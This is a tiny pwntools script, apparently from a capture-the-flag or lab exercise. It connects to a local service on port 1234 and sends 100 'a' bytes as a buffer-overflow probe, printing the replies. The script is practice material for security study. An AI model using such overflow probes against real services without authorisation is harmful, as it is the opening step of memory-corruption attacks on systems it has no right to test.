from pwn import *

p = remote("127.0.0.1", 1234)  
payload= b"a"*100
print(p.recv().decode())  
p.sendline(payload)      
print(p.recv().decode())  
p.close()